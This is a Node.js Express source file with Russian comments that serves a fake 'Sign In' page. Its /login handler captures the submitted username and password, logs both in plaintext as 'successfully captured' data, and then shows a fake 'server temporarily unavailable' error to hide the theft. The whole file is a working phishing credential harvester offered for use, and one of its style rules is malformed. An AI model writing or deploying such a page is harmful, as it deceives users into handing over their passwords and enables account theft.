const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Обязательно: учим сервер читать данные из HTML-форм
app.use(express.urlencoded({ extended: true }));

// 1. ОТОБРАЖЕНИЕ СТРАНИЦЫ ДЛЯ ПОЛЬЗОВАТЕЛЯ
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <style>
       body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #22252a; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        

         .auth-container { 
            background-color: #22252a; 
            padding: 30px; 
            border-radius: 4px; 
            width: 100%;
            max-width: 400px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }

        .input-control { 
            width: 100%; 
            padding: 12px 15px; 
            margin-bottom: 20px; 
            background-color: #2e3138; 
            border: 1px solid #40444f; 
            border-radius: 4px; 
            color: #ffffff; 
            font-size: 16px; 
            box-sizing: border-box; 
            transition: all 0.2s ease-in-out; 
        }
        .input-control::placeholder { color: #a0a5ab; }
        
        .input-control:focus { 
            outline: none; 
            border-color: #ffffff; 
            background-color: #3f434a;
            transform: scale(1.01); 
        }
        
        .btn-submit { 
            width: 100%; 
            padding: 12px; 
            background-color: transparent; 
            border: 1px solid #ffffff; 
            border-radius: 4px; 
            color: #ffffff; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            margin-bottom: 25px; 
            box-sizing: border-box;
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        .btn-submit:hover { 
            background-color: rgba(255, 255, 255, 0.1); 
        }
        .btn-submit:active { 
            transform: scale(0.97); 
        }
        
        .btn-submit:hover { 
            background-color: rgba(255, 255, 255, 0.15); 
        }
        
        .btn-submit:active { 
            transform: scale(0.95); 
            background-color: rgba(255, 255, 255, 0.25);
        }
        
        .secondary-actions { border-top: 1px solid #3f434a; padding-top: 20px; margin-top: 20px; }
        
         .btn-secondary { 
            width: 100%; 
            padding: 14px; 
            background-color: #2e3138; 
            border: none; 
            border-radius: 4px; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 500; 
            cursor: pointer; 
            margin-bottom: 12px; 
            text-align: center; 
            box-sizing: border-box;
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        .btn-secondary:hover { 
            background-color: #383c45; 
        }
        .btn-secondary:active { 
            transform: scale(0.97); 
        }
        
        .btn-secondary:hover { 
            background-color: #484c54; 
        }
        
        .btn-secondary:active { 
            transform: scale(0.96); 
        }
        
        . .link-text { 
            display: block; 
            text-align: center; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 600; 
            text-decoration: none; 
            margin: 20px 0; 
            transition: color 0.2s; 
        }
        .link-text:hover { text-decoration: underline; color: #cbd5e1; }
    </style>
</head>
<body>
<div class="auth-container">
    
    <h2 style="color: #ffffff; text-align: center; margin-top: 0; margin-bottom: 25px; font-size: 24px; font-weight: 600;">
        Sign In
    </h2>
    
    <form action="/login" method="POST">
        <input type="text" name="username" class="input-control" placeholder="Login / Email" required>
        <input type="password" name="password" class="input-control" placeholder="Password" required>
        <button type="submit" class="btn-submit">Log In</button>
    </form>

    <a href="#" class="link-text">Forgot password?</a>
    
    <div class="secondary-actions">
        <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
        <button type="button" class="btn-secondary">Quick Sign-in</button>
    </div>
    
    <a href="#" class="link-text" style="margin-top: 20px;">Create an account</a>
</div>
</body>
</html>
    `);
});

// 2. БЭКЕНД: ОБРАБОТКА ДАННЫХ И ИХ ОТПРАВКА В ОНЛАЙН-ЛОГИ
app.post('/login', (req, res) => {
    const userLogin = req.body.username;
    const userPassword = req.body.password;
    
    console.log(`\n========================================`);
    console.log(`[БЭКЕНД] ДАННЫЕ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
    console.log(`ЛОГИН: ${userLogin}`);
    console.log(`ПАРОЛЬ: ${userPassword}`);
    console.log(`========================================`);
    
    res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
});

app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
